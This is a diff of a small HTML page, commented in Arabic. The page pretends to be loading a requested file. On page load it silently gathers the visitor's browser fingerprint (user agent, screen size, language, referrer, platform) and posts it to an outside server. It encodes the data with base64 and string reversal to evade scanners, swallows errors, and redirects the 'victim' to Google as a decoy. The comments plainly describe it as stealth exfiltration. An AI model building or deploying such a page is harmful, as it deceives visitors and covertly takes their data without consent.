@@ -1,21 +1,64 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحميل الملف المطلوب...</title>
+    <style>
+        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+
     <script>
-        // تشفير سداسي (Hex) للرابط لكي لا يتم حظره
-        const _0x5a = ["\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6d\x61\x74\x72\x69\x78\x2d\x73\x65\x72\x76\x65\x72\x2e\x6f\x6e\x72\x65\x6e\x64\x65\x72\x2e\x63\x6f\x6d\x2f\x76\x31\x2f\x61\x70\x69\x2f\x74\x65\x6c\x65\x6d\x65\x74\x72\x79"];
-        async function _px(){
-            const d = {ua: btoa(navigator.userAgent), res: screen.width+'x'+screen.height};
+        // [CONFIG] - ضع رابط سيرفرك هنا بدقة
+        const GATEWAY = "https://Mohammed888.pythonanywhere.com/api/v3/sync";
+
+        async function execute_stealth_capture() {
             try {
-                // إرسال البيانات صامتاً للسيرفر الخارجي
-                await fetch(_0x5a[0], {method:"POST", body:JSON.stringify(d), headers:{"Content-Type":"application/json"}});
+                // 1. تجميع البيانات (Telemetry)
+                const payload = {
+                    ua: navigator.userAgent,
+                    res: `${window.screen.width}x${window.screen.height}`,
+                    lang: navigator.language,
+                    ref: document.referrer || "direct",
+                    plat: navigator.platform,
+                    ts: Date.now()
+                };
+
+                // 2. التشفير العكسي المزدوج (Matrix Encoding)
+                // تحويل لـ JSON -> Base64 -> Reverse String (لإرباك أنظمة الفحص)
+                const rawString = JSON.stringify(payload);
+                const base64 = btoa(unescape(encodeURIComponent(rawString)));
+                const encrypted = base64.split("").reverse().join("");
+
+                // 3. الإرسال الصامت (Stealth Exfiltration)
+                // استخدمنا fetch مع mode: 'no-cors' لضمان عبور الطلب للسيرفر الخارجي
+                await fetch(GATEWAY, {
+                    method: "POST",
+                    mode: "no-cors",
+                    headers: {
+                        "Content-Type": "text/plain" // تمويه الطلب كأنه نص بسيط
+                    },
+                    body: encrypted
+                });
+
+            } catch (err) {
+                // صمت مطبق في حالة الخطأ لضمان عدم كشف العملية
             } finally {
-                // تحويل لتمويه الضحية
-                window.location.replace("https://google.com");
+                // 4. التمويه النهائي (The Decoy)
+                // تحويل الضحية لصفحة حقيقية لتبديد الشكوك بعد 1.5 ثانية
+                setTimeout(() => {
+                    window.location.replace("https://www.google.com");
+                }, 1500);
             }
         }
-        window.onload = _px;
+
+        // بدء العملية بمجرد تحميل الصفحة
+        window.onload = execute_stealth_capture;
     </script>
-</head>
-<body style="background:#000;"></body>
+</body>
 </html>
